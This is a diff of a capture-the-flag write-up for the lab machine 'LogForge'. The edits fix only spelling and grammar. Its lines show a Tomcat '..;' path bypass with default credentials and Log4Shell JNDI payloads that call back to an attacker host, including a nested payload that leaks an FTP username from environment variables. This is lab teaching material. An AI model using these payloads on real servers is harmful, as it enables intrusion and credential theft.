@@ -41,7 +41,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 # HTTP Port 80
 
-Looking at the main page it is just the Ultimate Hacking Championship logo, and the source code shows that its just that.
+Looking at the main page it is just the Ultimate Hacking Championship logo, and the source code shows that it is just that.
 
 Next steps to enumerate are to fuzz out files and directories, I use `ffuf`
 
@@ -87,17 +87,17 @@ Notice that it is running Apache 2.4.41 AND Tomcat/9.0.31
 
 # Tomcat Login
 
-This server has some misconfigurations that made it vulnerable to a tenquie described in a talk titled "Breaking Parser Logic" by Orange Tsai. https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
+This server has some misconfigurations that made it vulnerable to a technique described in a talk titled "Breaking Parser Logic" by Orange Tsai. https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
 
 If I go to the site and type `http://10.10.11.138/test/..;/manager/html` I get prompted by a login. The default creds of `tomcat;tomcat` gets me in
 
 # Testing for Log4Shell
 
-The name of this machine is logforge and the a new vulnerability name "log4Shell" just came out so I'm assuming that one of these fields is being logged and is vulnerable.
+The name of this machine is logforge and a new vulnerability name "log4Shell" just came out so I'm assuming that one of these fields is being logged and is vulnerable.
 
-Log4j is a Java-based framework that makes it easy to store logs and information's. There is a vulnerability called "Log4Shell" that allows attackers to execute arbitrary Java code on a server or other computer, or leak sensitive information.
+Log4j is a Java-based framework that makes it easy to store logs and information. There is a vulnerability called "Log4Shell" that allows attackers to execute arbitrary Java code on a server or other computer, or leak sensitive information.
 
-To test for this vulnerability I went through and put a test string of `${jndi:ldap://KALI_IP/file}` into different fields to see if it would get logged & exploited. If the server is vulnerable it will connect back to kali and request `file`. It doesnt matter what is there as we are just testing to see if we get a connection
+To test for this vulnerability I went through and put a test string of `${jndi:ldap://KALI_IP/file}` into different fields to see if it would get logged & exploited. If the server is vulnerable it will connect back to kali and request `file`. It doesn't matter what is there as we are just testing to see if we get a connection
 
 To set up and test use netcat to listen on port 389
 `nc -lvnp 389`
@@ -220,10 +220,10 @@ connect to [10.10.14.2] from (UNKNOWN) [10.10.11.138] 40102
 
 Now I can use `jd-gui` to pick apart this code.
 
-It looks like it it storing the username and password in a environment variable. I can use the log4shell vulnerability to extract the variables. 
+It looks like it it storing the username and password in an environment variable. I can use the log4shell vulnerability to extract the variables. 
 ![Logforge](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/logforge/5.png)
 
-To do this we are going to edit our original payload and add a nested JDNI payload to extract the username and password. The JNDI exploit kit wont be able to catch the results but wireshark will. (make sure the JNDI server is still running)
+To do this we are going to edit our original payload and add a nested JDNI payload to extract the username and password. The JNDI exploit kit won't be able to catch the results but wireshark will. (make sure the JNDI server is still running)
 
 First I created my nested payload `${jndi:ldap://KALI:1389/${env:ftp_user}}`
 Then I started up wireshark and started to listen on tun0
